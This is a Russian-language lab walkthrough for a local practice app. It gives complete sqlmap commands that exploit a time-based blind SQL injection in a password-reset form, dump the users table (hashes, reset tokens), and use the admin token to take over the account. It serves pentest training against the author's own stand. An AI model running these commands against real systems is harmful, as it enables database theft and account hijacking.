# Эксплуатация через sqlmap (готовый инструмент)

sqlmap — готовый инструмент, который сам находит SQL-инъекцию и выкачивает
данные из БД. Натравим его на ту же форму `/forgot` и покажем, что он
**только по времени ответа** вытащит содержимое базы (включая reset_token).
Потом то же самое сделаем своим скриптом.

## 0. Что нужно
- Приложение запущено в **уязвимом** режиме (`SAFE_MODE=false`, мы это уже поставили)
  на http://localhost:8000 — проверь, что открывается.
- Python (sqlmap написан на нём). Нет Python — ставим в шаге 1.

## 1. Поставить Python (если ещё нет)
1. https://www.python.org/downloads/ → Download Python (Windows).
2. В установщике ОБЯЗАТЕЛЬНО поставь галочку **«Add python.exe to PATH»**, потом Install.
3. Проверь: в PowerShell набери `python --version` — покажется версия.

## 2. Скачать sqlmap
1. https://github.com/sqlmapproject/sqlmap → кнопка **Code** → **Download ZIP**
   (или прямая ссылка: https://github.com/sqlmapproject/sqlmap/archive/refs/heads/master.zip).
2. Распакуй, например, в `C:\sqlmap` (внутри должен лежать `sqlmap.py`).

## 3. Запуск по форме /forgot
В PowerShell перейди в папку sqlmap:
```
cd C:\sqlmap
```

### 3.1. Найти инъекцию
```
python sqlmap.py -u "http://localhost:8000/forgot" --data="email=test@demo.local" -p email --dbms=mysql --technique=T --time-sec=2 --level=2 --risk=2 --batch
```
Что значат флаги:
- `-u` — адрес страницы;
- `--data="email=..."` — тело POST-запроса (так sqlmap понимает, что это POST и где параметр);
- `-p email` — какой параметр атаковать;
- `--dbms=mysql` — подсказка, что база MySQL;
- `--technique=T` — только time-based (у нас слепая по времени);
- `--time-sec=2` — на сколько секунд «усыплять» базу (меньше = быстрее проверка);
- `--level=2 --risk=2` — глубина проверок (больше payload'ов);
- `--batch` — не задавать вопросов, отвечать по умолчанию.

Если увидишь в выводе `parameter 'email' is ... injectable` и `Type: time-based blind` —
sqlmap сам подтвердил уязвимость.

### 3.2. Посмотреть базы
```
python sqlmap.py -u "http://localhost:8000/forgot" --data="email=test@demo.local" -p email --dbms=mysql --technique=T --time-sec=2 --batch --current-db
```
→ покажет `appdb`.

### 3.3. Выкачать данные (эксфильтрация)
Только токен админа (быстрее):
```
python sqlmap.py -u "http://localhost:8000/forgot" --data="email=test@demo.local" -p email --dbms=mysql --technique=T --time-sec=2 --batch -D appdb -T users -C username,reset_token --dump
```
Вся таблица users (логины, email, хэши паролей, токены):
```
python sqlmap.py -u "http://localhost:8000/forgot" --data="email=test@demo.local" -p email --dbms=mysql --technique=T --time-sec=2 --batch -D appdb -T users --dump
```
sqlmap по одному символу (по времени ответа) соберёт значения. Time-based — это
медленно, но всё происходит автоматически.

## 4. Что отметить
- sqlmap подтвердил инъекцию и вытащил данные **только по задержке ответа** —
  на странице ничего не выводится.
- Полученный `reset_token` админа используешь как раньше: `/reset?token=<токен>`
  → меняешь пароль → вход под админом (угон).
- В отчёте напишешь, что проверил и готовым инструментом (sqlmap), и своим
  скриптом — это показывает, что понимаешь механику, а не только «кнопку».

> Запускать sqlmap только против своего локального стенда. Это учебный
> инструмент пентеста; применять к чужим сайтам без разрешения — незаконно.
